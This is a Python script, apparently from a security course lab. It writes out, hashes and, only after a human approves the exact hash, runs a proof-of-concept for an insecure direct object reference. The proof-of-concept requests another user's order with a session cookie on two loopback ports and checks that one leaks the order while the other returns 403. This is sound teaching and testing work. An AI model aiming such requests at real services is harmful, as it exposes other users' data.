"""Generate one bounded local PoC; execute only exact reviewed bytes with an approval hash."""

import argparse
import hashlib
import subprocess
import sys
from pathlib import Path

PAYLOAD = '''"""Generated local IDOR contrast; only the course loopback service is addressed."""
import json
from urllib.error import HTTPError
from urllib.request import HTTPRedirectHandler, ProxyHandler, Request, build_opener

class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None

opener = build_opener(ProxyHandler({}), NoRedirect())
rows = []
for port in (8787, 8788):
    req = Request(f"http://127.0.0.1:{port}/orders?id=2", headers={"Cookie":"sid=alice-lab"})
    try:
        response = opener.open(req, timeout=5)
    except HTTPError as exc:
        response = exc
    with response:
        rows.append({"port":port,"status":response.status,"body":response.read(4096).decode()})
print(json.dumps(rows, ensure_ascii=False, indent=2))
assert rows[0]["status"] == 200 and "B-book" in rows[0]["body"]
assert rows[1]["status"] == 403
'''


def validate(file, approved_sha):
    data = file.read_bytes()
    digest = hashlib.sha256(data).hexdigest()
    if data != PAYLOAD.encode() or digest != approved_sha:
        raise ValueError("PoC bytes or approved hash changed; review again")
    return digest


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("command", choices=["prepare", "verify", "execute"])
    parser.add_argument("--file", type=Path, required=True)
    parser.add_argument("--approved-sha")
    args = parser.parse_args(argv)
    try:
        if args.command == "prepare":
            args.file.parent.mkdir(parents=True, exist_ok=True)
            with args.file.open("x", encoding="utf-8") as output:
                output.write(PAYLOAD)
            print(PAYLOAD)
            print("SHA256:", hashlib.sha256(PAYLOAD.encode()).hexdigest())
            print("No request sent. Human approval must name this exact hash before execute.")
            return 0
        if not args.approved_sha:
            raise ValueError("Missing --approved-sha")
        validate(args.file, args.approved_sha)
        if args.command == "verify":
            print("Bytes match; no request sent")
            return 0
        return subprocess.call([sys.executable, "-c", PAYLOAD])
    except (OSError, ValueError) as exc:
        print(f"Gate stopped: {exc}")
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
